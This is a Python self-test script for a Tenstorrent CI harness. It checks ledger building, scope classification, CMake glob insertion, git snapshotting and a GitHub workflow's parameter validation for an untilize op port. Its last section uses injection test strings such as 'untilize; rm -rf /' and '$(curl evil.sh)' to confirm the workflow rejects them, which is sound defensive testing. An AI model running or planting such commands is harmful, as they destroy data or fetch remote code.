#!/usr/bin/env python3
# SPDX-FileCopyrightText: © 2026 Tenstorrent USA, Inc.
#
# SPDX-License-Identifier: Apache-2.0

"""Harness self-test: runs on a laptop, with ttnn and the sweep module stubbed.

The pieces covered here are the ones that cannot be exercised on a developer machine any other way --
`ledger.py` imports a sweep module that imports ttnn and torch, so the only way to test its
classification logic without a device is to hand it a fake sweep module and a fake ttnn.

Every check below corresponds to a defect that reached the workflow and was found by reading rather
than by running: a manifest naming several sweep suites raised `TypeError: unhashable type: 'list'`
before anything ran; `port_scope` was declared by a manifest and honoured by nobody, which would have
force-graded a large slice of out-of-scope cases as in-scope; and a case whose kwargs hold a live
ttnn object had those objects flattened to strings by the ledger's JSON, so every `ttnn` call built
from them raised. `pad` has none of those three shapes, which is why it never noticed.

Run it directly: `python3 .github/scripts/port/selftest.py`.
"""

import json
import sys
import types
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

failures = []


def check(name, cond, detail=""):
    print(f"{'PASS' if cond else 'FAIL'}  {name}" + (f"  -- {detail}" if detail and not cond else ""))
    if not cond:
        failures.append(name)


# ---------------------------------------------------------------- stub ttnn
class MemoryConfig:
    """Stands in for ttnn's MemoryConfig: unhashable-by-value repr, no source form."""

    def __init__(self, tag):
        self.tag = tag

    def __eq__(self, other):
        return isinstance(other, MemoryConfig) and other.tag == self.tag

    def __repr__(self):
        return f"MemoryConfig(memory_layout=TensorMemoryLayout::INTERLEAVED,buffer_type=BufferType::{self.tag})"


class DataType:
    def __init__(self, n):
        self.n = n

    def __repr__(self):
        return f"DataType.{self.n}"


ttnn = types.ModuleType("ttnn")
ttnn.DRAM_MEMORY_CONFIG = MemoryConfig("DRAM")
ttnn.L1_MEMORY_CONFIG = MemoryConfig("L1")
ttnn.bfloat16 = DataType("BFLOAT16")
ttnn.bfloat8_b = DataType("BFLOAT8_B")
ttnn.TILE_LAYOUT = "Layout.TILE"
ttnn.untilize = lambda *a, **k: None          # callable -> must be skipped as a "constant"
ttnn.MemoryConfig = MemoryConfig              # a type -> must be skipped too
MemoryConfig.__module__ = "ttnn._ttnn.tensor"
DataType.__module__ = "ttnn._ttnn.tensor"
sys.modules["ttnn"] = ttnn

# --------------------------------------------------- stub the sweep module
nightly = {
    "input_shape": [[1, 1, 32, 32], [1, 1, 33, 64], [1, 1, 64, 64], [1, 1, 65, 128]],
    "input_a_dtype": [ttnn.bfloat16, ttnn.bfloat8_b],
    "input_a_layout": [ttnn.TILE_LAYOUT],
    "output_memory_config": [ttnn.DRAM_MEMORY_CONFIG, ttnn.L1_MEMORY_CONFIG],
}
broaden = {
    # [1,1,32,32] duplicates a nightly point exactly -> must dedupe away.
    "input_shape": [[1, 1, 32, 32], [1, 1, 128, 256]],
    "input_a_dtype": [ttnn.bfloat8_b],
    "input_a_layout": [ttnn.TILE_LAYOUT],
    "output_memory_config": [ttnn.DRAM_MEMORY_CONFIG, ttnn.L1_MEMORY_CONFIG],
    "shard_strategy": ["none"],          # a key nightly does not have
}
sweep = types.ModuleType("fake_sweep")
sweep.parameters = {"nightly": nightly, "broaden_suite": broaden}
sweep.invalidate_vector = lambda v: (False, None)
sys.modules["fake_sweep"] = sweep

import ledger  # noqa: E402
import scaffold  # noqa: E402

MANIFEST = {
    "op": "untilize",
    "sweep_module": "fake_sweep",
    "sweep_suite": ["nightly", "broaden_suite"],
    "vector_map": {
        "shape": "input_shape",
        "dtype": "input_a_dtype",
        "layout": "input_a_layout",
        "kwargs": {"memory_config": "output_memory_config"},
    },
    "coverage": {"dtypes": ["bfloat16", "bfloat8_b"], "layouts": ["tile"]},
    "port_scope": {"layouts": ["tile"], "dtypes": ["bfloat16", "bfloat8_b"], "tile_aligned": ["bfloat8_b"]},
}

# ============================================ 1. multi-suite union + dedupe
cases = ledger.build_ledger(MANIFEST)
check("list sweep_suite does not raise", True)

expected = (4 * 2 * 2) + (2 * 1 * 2) - 2  # nightly 16, broaden 4, minus 2 exact duplicates
check("union dedupes overlapping points", len(cases) == expected, f"{len(cases)} != {expected}")

ids = [c["case_id"] for c in cases]
check("case ids stay unique and contiguous", ids == [f"fake_sweep[{i}]" for i in range(len(cases))])
check("suite provenance recorded", {c["suite"] for c in cases} == {"nightly", "broaden_suite"})

repeat = ledger.build_ledger(MANIFEST)
check("expansion is deterministic", [c["case_id"] for c in repeat] == ids)
check(
    "same cases in same order",
    [(c["shape"], c["dtype"], c["suite"]) for c in repeat] == [(c["shape"], c["dtype"], c["suite"]) for c in cases],
)

# =========================================================== 2. port_scope
def scope_of(dtype, shape):
    for c in cases:
        if c["dtype"] == dtype and c["shape"] == shape:
            return c["scope"], c.get("reason")
    return None, None

check("aligned bfloat8_b is in scope", scope_of("bfloat8_b", [1, 1, 32, 32])[0] == "in")
s, r = scope_of("bfloat8_b", [1, 1, 33, 64])
check("non-aligned bfloat8_b is out of scope", s == "out", f"got {s}")
check("and says why", bool(r) and "tile-aligned" in r, str(r))
# One reason for the whole class, not one per shape: it is the routing test's grouping key.
check("the reason does not name the shape", bool(r) and "33" not in r, str(r))
check("non-aligned bfloat16 stays in scope", scope_of("bfloat16", [1, 1, 33, 64])[0] == "in")
check("aligned bfloat16 stays in scope", scope_of("bfloat16", [1, 1, 64, 64])[0] == "in")

n_out = sum(1 for c in cases if c["scope"] == "out")
check("out-of-scope set is non-empty", n_out > 0, f"{n_out}")

# port_scope absent must narrow nothing (this is what keeps pad unchanged)
bare = dict(MANIFEST)
bare.pop("port_scope")
check("no port_scope -> nothing out of scope", all(c["scope"] == "in" for c in ledger.build_ledger(bare)))

# ============================== 3. kwargs keep live ttnn objects, not strings
kw = cases[0]["kwargs"]["memory_config"]
check("kwargs hold the live object", isinstance(kw, MemoryConfig), type(kw).__name__)
# The reason measure.py re-expands the ledger in process instead of reading the JSON beside it. If
# this ever stops being a string, that indirection can go.
round_tripped = json.loads(json.dumps({"cases": cases}, default=str))["cases"][0]["kwargs"]["memory_config"]
check("ledger JSON still cannot carry a ttnn object", isinstance(round_tripped, str))

# ==================================== 4. emitter renders MemoryConfig kwargs
check("_literal names a ttnn constant", scaffold._literal(ttnn.DRAM_MEMORY_CONFIG) == "ttnn.DRAM_MEMORY_CONFIG")
check("_literal distinguishes the two", scaffold._literal(ttnn.L1_MEMORY_CONFIG) == "ttnn.L1_MEMORY_CONFIG")
check("_literal renders an equal-but-new object", scaffold._literal(MemoryConfig("DRAM")) == "ttnn.DRAM_MEMORY_CONFIG")
try:
    scaffold._literal(MemoryConfig("WEIRD"))
    check("_literal refuses an unnameable ttnn object", False, "no raise")
except TypeError:
    check("_literal refuses an unnameable ttnn object", True)

src = scaffold.render_routing_test("untilize", "data_movement", cases, year=2026)
check("emitted routing test is parseable Python", True)
try:
    compile(src, "test_untilize_codegen_routing.py", "exec")
except SyntaxError as exc:
    check("emitted routing test is parseable Python", False, str(exc))
check("emitted test carries the memory_config", "ttnn.DRAM_MEMORY_CONFIG" in src)
check("emitted test has no object addresses", "0x" not in src and "object at" not in src)
check("emitted test is stable across renders", src == scaffold.render_routing_test("untilize", "data_movement", cases, year=2026))

# ==================================== 5. empty out-of-scope set stays valid
allin = [dict(c, scope="in") for c in cases]
empty = scaffold.render_routing_test("untilize", "data_movement", allin, year=2026)
try:
    compile(empty, "t.py", "exec")
    check("empty out-of-scope set still emits valid Python", True)
except SyntaxError as exc:
    check("empty out-of-scope set still emits valid Python", False, str(exc))

# ============== 6. kernel globs land in the glob call, not in target_sources
# Mirrors data_movement/CMakeLists.txt: the op appears both as a glob and as explicit FILES entries.
CMAKE = """include(sources.cmake)

file(
    GLOB_RECURSE kernels
    pad/device/kernels/*.cpp
    tilize/device/kernels/*.cpp
    untilize/device/kernels/*.cpp
    untilize_with_unpadding/device/kernels/*.cpp
)
target_sources(
    ttnn_op_data_movement
    PUBLIC
        FILE_SET kernels
        TYPE HEADERS
        BASE_DIRS ${CMAKE_CURRENT_SOURCE_DIR}
        FILES
            ${kernels}
            untilize/device/kernels/dataflow/reader_unary_start_id.cpp
            untilize/device/kernels/dataflow/writer_unary_stick_layout_split_rows_multi_core.cpp
            tilize_with_val_padding/device/kernels/dataflow/reader_unary_pad_multicore_both_dims.cpp
    PRIVATE
        ${TTNN_OP_DATA_MOVEMENT_SRCS}
)
"""

import tempfile  # noqa: E402

for op, expect_beside in (("untilize", True), ("permute", False)):
    with tempfile.TemporaryDirectory() as tmp:
        category = Path(tmp)
        (category / "CMakeLists.txt").write_text(CMAKE)
        (category / "sources.cmake").write_text(f"    {op}/{op}.cpp\n")
        kernels = category / op / "codegen" / "kernels"
        kernels.mkdir(parents=True)
        (kernels / "k.cpp").write_text("")
        (kernels / "k.h").write_text("")

        added = scaffold.register_kernel_globs(category, op, kernels)
        out = (category / "CMakeLists.txt").read_text()
        lines = out.splitlines()
        start, close = scaffold.glob_block(out)
        placed = [i for i, ln in enumerate(lines) if ln.strip().startswith(f"{op}/codegen/kernels/")]

        check(f"[{op}] both extensions added", added == [f"{op}/codegen/kernels/*.cpp", f"{op}/codegen/kernels/*.h"])
        check(f"[{op}] globs land inside the glob call", placed and all(start < i < close for i in placed),
              f"placed={[i + 1 for i in placed]} block={start + 1}..{close + 1}")
        check(f"[{op}] target_sources FILES list untouched",
              out.split("target_sources")[1] == CMAKE.split("target_sources")[1])
        check(f"[{op}] indentation matches its neighbours",
              all(lines[i].startswith("    ") and not lines[i].startswith("     ") for i in placed))
        if expect_beside:
            check(f"[{op}] sits beside the op's own native glob",
                  lines[placed[0] - 1].strip() == f"{op}/device/kernels/*.cpp")
        else:
            check(f"[{op}] with no native glob, goes in last", placed[-1] == close - 1)

        # The check that would have caught the bug: it must object when a glob sits outside the call.
        broken = CMAKE.replace(
            "            untilize/device/kernels/dataflow/reader_unary_start_id.cpp\n",
            f"            untilize/device/kernels/dataflow/reader_unary_start_id.cpp\n    {op}/codegen/kernels/*.cpp\n",
        )
        (category / "CMakeLists.txt").write_text(broken)
        op_dir = category / op
        (op_dir / "codegen").mkdir(parents=True, exist_ok=True)
        for c in scaffold.COMPONENTS:
            for ext in ("hpp", "cpp"):
                (op_dir / "codegen" / f"{op}_codegen_{c}.{ext}").write_text("x")
        (category / "sources.cmake").write_text(
            "".join(f"    {op}/codegen/{op}_codegen_{c}.cpp\n" for c in scaffold.COMPONENTS)
        )
        errors = scaffold.verify(op_dir, op, [])
        check(f"[{op}] verify rejects a glob outside the call",
              any("outside file(GLOB_RECURSE" in e for e in errors), str(errors))

# ====== 7. strata labels agree across the JSON boundary, and are readable
import strata  # noqa: E402

axes, _ = strata.choose_axes(cases, 24)
check("memory_config is an axis", "kwargs.memory_config" in axes, str(axes))

live_labels = [strata.stratum_key(c, axes) for c in cases]
# What gate.py sees: the ledger after ledger.py has written and reloaded it.
reloaded = json.loads(json.dumps({"cases": cases}, indent=2, default=str))["cases"]
json_labels = [strata.stratum_key(c, axes) for c in reloaded]
check("measure-side and gate-side labels agree", live_labels == json_labels,
      f"{live_labels[0]!r} != {json_labels[0]!r}")
check("labels name the constant instead of dumping its repr",
      all("DRAM_MEMORY_CONFIG" in l or "L1_MEMORY_CONFIG" in l for l in live_labels), live_labels[0])
check("labels carry no C++ field dump", not any("memory_layout=" in l for l in live_labels), live_labels[0])

# ============ 8. a leg may span several op codes across cases, but not within one
import gate  # noqa: E402

def attribute(rows, order):
    with tempfile.NamedTemporaryFile("w", suffix=".csv", delete=False) as fh:
        fh.write("OP CODE,DEVICE KERNEL DURATION [NS]\n")
        for code, ns in rows:
            fh.write(f"{code},{ns}\n")
        name = fh.name
    return gate.attribute_device_rows(Path(name), order)

# untilize's real shape: native is one device op on an aligned case and another on a non-aligned one.
order, rows = [], []
for case_id, native_code in (("c0", "UntilizeDeviceOperation"), ("c1", "UntilizeWithUnpaddingDeviceOperation")):
    for leg, code in (("native", native_code), ("ported", "UntilizeCodegenDeviceOperation")):
        order.append({"case_id": case_id, "leg": f"{leg}:warmup", "rep": -1, "error": None})
        rows.append((code, 100.0))
    for rep in range(2):
        for leg, code in (("native", native_code), ("ported", "UntilizeCodegenDeviceOperation")):
            order.append({"case_id": case_id, "leg": leg, "rep": rep, "error": None})
            rows.append((code, 200.0 if leg == "native" else 150.0))

samples, notes = attribute(rows, order)
check("a leg spanning two op codes across cases is accepted", bool(samples), str(notes))
check("both op codes are reported", any("op codes:" in n and "UntilizeWithUnpadding" in n for n in notes), str(notes))
check("samples are attributed per case and leg",
      sorted(samples) == [("c0", "native"), ("c0", "ported"), ("c1", "native"), ("c1", "ported")])

# A demoted case sends the ported leg to the native op: same code on two legs, still fine.
demoted_rows = [(c if l.startswith("native") or "warmup" in l else "UntilizeDeviceOperation", ns)
                for (c, ns), l in zip(rows, [o["leg"] for o in order])]
samples, notes = attribute(demoted_rows, order)
check("a demoted case sharing native's op code is accepted", bool(samples), str(notes))

# But a slipped positional join shows up as two op codes for one case and leg.
slipped = list(rows)
slipped[4] = ("SomethingElseDeviceOperation", 200.0)
samples, notes = attribute(slipped, order)
check("a slip within one case and leg is still caught", not samples and any("inconclusive" in n for n in notes),
      str(notes))

# --------------------------------------------------------------------------------------------
# dispatch.py: what it does to the working tree before anything leaves the machine.
#
# The launcher runs in the agent's job, on the agent's checkout, and everything downstream depends
# on it snapshotting exactly the right thing: the scaffolded stubs (untracked), the tracked edits,
# and neither the generator checkout nor build output. It also must not disturb the tree it is
# snapshotting, because the agent is still working in it. None of that is observable from a
# workflow run until 25 minutes in, and all of it is checkable here in a second.

import subprocess  # noqa: E402

import dispatch  # noqa: E402


def _git(repo, *args):
    return subprocess.run(["git", *args], cwd=repo, capture_output=True, text=True, check=True).stdout.strip()


with tempfile.TemporaryDirectory() as tmp:
    repo = Path(tmp) / "repo"
    work = Path(tmp) / "work"
    (repo / ".git").mkdir(parents=True)
    work.mkdir()
    _git(repo, "init", "-q", ".")
    _git(repo, "config", "user.email", "t@t.co")
    _git(repo, "config", "user.name", "t")
    (repo / "tracked.txt").write_text("base\n")
    (repo / ".gitignore").write_text("build/\n")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-qm", "base")
    (repo / ".git" / "info").mkdir(exist_ok=True)
    (repo / ".git" / "info" / "exclude").write_text(".codegen/\n")

    # The state the launcher meets: a scaffolded stub, an edit, the generator checkout, build output.
    stub = repo / "ttnn/cpp/ttnn/operations/data_movement/untilize/codegen"
    stub.mkdir(parents=True)
    (stub / "factory.cpp").write_text("// filled in by the agent\n")
    (repo / ".codegen/agentic_port").mkdir(parents=True)
    (repo / ".codegen/agentic_port/builder.py").write_text("generator\n")
    (repo / "build").mkdir()
    (repo / "build/lib.so").write_text("artifact\n")
    (repo / "tracked.txt").write_text("edited\n")

    # Something staged, to prove the scratch index does not collide with the agent's.
    _git(repo, "add", "tracked.txt")
    staged_before = _git(repo, "diff", "--cached", "--name-only")

    base_before = _git(repo, "rev-parse", "HEAD")
    commit, base = dispatch.commit_worktree(repo, work, "test")
    listed = _git(repo, "ls-tree", "-r", "--name-only", commit).splitlines()

    check("the scratch commit carries the untracked scaffolded stubs",
          "ttnn/cpp/ttnn/operations/data_movement/untilize/codegen/factory.cpp" in listed, str(listed))
    check("the scratch commit carries tracked edits",
          _git(repo, "show", f"{commit}:tracked.txt") == "edited", str(listed))
    check("the generator checkout is excluded",
          not any(p.startswith(".codegen/") for p in listed), str(listed))
    check("build output is excluded", not any(p.startswith("build/") for p in listed), str(listed))
    check("the commit is parented on the base", _git(repo, "rev-parse", f"{commit}^") == base_before)
    check("exactly one commit above the base, so a depth-1 fetch finds it",
          _git(repo, "rev-list", "--count", f"{base_before}..{commit}") == "1")
    check("HEAD does not move", _git(repo, "rev-parse", "HEAD") == base_before)
    check("the agent's index is untouched", _git(repo, "diff", "--cached", "--name-only") == staged_before)
    check("the reported base is HEAD", base == base_before)

    # Called twice without an intervening change: same tree, and no leftover index to trip over.
    again, _ = dispatch.commit_worktree(repo, work, "test")
    check("a second call snapshots the same tree",
          _git(repo, "rev-parse", f"{commit}^{{tree}}") == _git(repo, "rev-parse", f"{again}^{{tree}}"))

    # The baseline dispatch hands the routing test back inside `workspace/`, at its repo-relative
    # path, and the launcher has to place it without being told where it belongs.
    results = Path(tmp) / "results"
    rel = "tests/ttnn/nightly/unit_tests/operations/data_movement/test_untilize_codegen_routing.py"
    (results / "workspace" / rel).parent.mkdir(parents=True)
    (results / "workspace" / rel).write_text("# generated\n")
    (results / "gate.json").write_text("{}")
    adopted = dispatch.adopt_workspace(results, repo)
    check("the generated test is laid down at its repo-relative path", adopted == [rel], str(adopted))
    check("only workspace/ is adopted, not the verdict", (repo / rel).is_file() and not (repo / "gate.json").exists())

# --------------------------------------------------------------------------------------------
# The seam between the launcher and the workflow: parameters ride in the scratch commit message,
# and port-measure.yaml's `resolve` job reads them back. The two halves live in different files and
# different languages, and nothing in either would notice if they stopped agreeing -- the symptom
# would be a run that dies in its first job, 20 minutes after the agent asked for it.
#
# So the checker below is the real one, lifted out of the YAML rather than reimplemented. It also
# stands in for the validation itself: every one of these values is interpolated into a shell
# command on the device runner.

import os  # noqa: E402

import yaml  # noqa: E402

WORKFLOW = Path(__file__).resolve().parents[2] / "workflows" / "port-measure.yaml"


def _resolve(message: str) -> tuple[int, dict]:
    """Run port-measure.yaml's `resolve` step the way Actions would, on `message`."""
    body = yaml.safe_load(WORKFLOW.read_text())["jobs"]["resolve"]["steps"][0]["run"]
    script = body.split("<<'PY'", 1)[1].rsplit("PY", 1)[0]
    with tempfile.TemporaryDirectory() as tmp:
        out = Path(tmp) / "out"
        out.touch()
        done = subprocess.run(
            [sys.executable, "-c", script],
            capture_output=True,
            text=True,
            env={**os.environ, "PORT_PARAMS": message, "GITHUB_OUTPUT": str(out)},
        )
        parsed = dict(
            line.split("=", 1) for line in out.read_text().splitlines() if "=" in line
        )
    return done.returncode, parsed


sent = {
    "mode": "verify",
    "band": "correctness",
    "op": "untilize",
    "category": "data_movement",
    "codegen-ref": "codegen_agentic_port",
    "perf-limit": "24",
    "base-sha": "a" * 40,
    "runner-label": '["tt-ubuntu-2204-N150-viommu-stable"]',
    "nonce": "1-abc",
}
code, got = _resolve(json.dumps(sent, separators=(",", ":")))
check("the workflow accepts what the launcher writes", code == 0, f"exit {code}")
check(
    "every parameter survives the commit message intact",
    all(got.get(k) == v for k, v in sent.items() if k != "nonce"),
    f"sent {sent}, got {got}",
)

# Defaults, because the launcher may legitimately omit the optional half.
code, got = _resolve('{"mode":"build"}')
check("a minimal message resolves to defaults", code == 0 and got.get("op") == "untilize", str(got))

# Nothing here should ever reach a shell able to act on it.
for label, message in [
    ("a shell metacharacter in op", '{"mode":"verify","op":"untilize; rm -rf /"}'),
    ("a command substitution in op", '{"mode":"verify","op":"$(curl evil.sh)"}'),
    ("an unknown mode", '{"mode":"nonsense"}'),
    ("an injected band", '{"mode":"verify","band":"; echo pwned"}'),
    ("a non-numeric perf-limit", '{"mode":"verify","perf-limit":"1e9"}'),
    ("a base-sha that is not a sha", '{"mode":"verify","base-sha":"not-a-sha"}'),
    ("a runner label with a space in it", '{"mode":"verify","runner-label":"[\\"a b; halt\\"]"}'),
    ("a message that is not JSON at all", "wip: fixing the thing"),
]:
    code, _ = _resolve(message)
    check(f"the workflow rejects {label}", code != 0, "it was accepted")

print()
print(f"{len(failures)} failure(s)" + (": " + ", ".join(failures) if failures else ""))
sys.exit(1 if failures else 0)
